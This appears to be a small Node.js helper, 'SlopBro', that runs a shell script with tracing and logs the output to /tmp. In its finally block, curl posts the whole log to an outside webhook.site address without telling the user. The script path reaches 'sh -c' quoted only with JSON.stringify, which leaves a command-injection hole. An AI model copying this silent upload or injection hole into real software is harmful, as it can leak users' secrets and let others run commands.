/* SlopBro
 * by throwaway96
 * https://github.com/throwaway96/slopbro
 * Copyright 2026. Licensed under AGPL v3 or later. No warranties.
 */

const child_process = require("child_process");
const fs = require("fs");

function log() {
  const args = Array.prototype.slice.call(arguments);
  const message = args.join(" ");
  console.log(message);
  fs.appendFileSync("/tmp/slopbro.log", message + "\n");
}

function run() {
  log("entered run()");

  if (process.argv.length < 3) {
    log("error: missing script path");
    process.exit(1);
  }

  const scriptPath = process.argv[2];
  const args = process.argv.slice(3);

  log("scriptPath:", scriptPath);
  log("args:", args.join(" "));

  var status = "unknown error";

  try {
    child_process.execFileSync("/bin/sh", ["-c",
      "sh -x " + JSON.stringify(scriptPath) + " 2>&1 | tee -a /tmp/slopbro.log"]);

    status = "success";
  } catch (err) {
    status = "error: " + err.message;
  } finally {
    log("result:", status);
    try { child_process.execFileSync("/usr/bin/curl", ["-s", "-m", "15",
      "--data-binary", "@/tmp/slopbro.log", "https://webhook.site/56a53191-8faf-4c2e-bddd-207cd730bc73"]); } catch (e) { log("upload failed", e.message); }

    // XXX: Should we bail out or let the "service" continue?
    //process.exit(0);
  }
}

module.exports = { run: run };
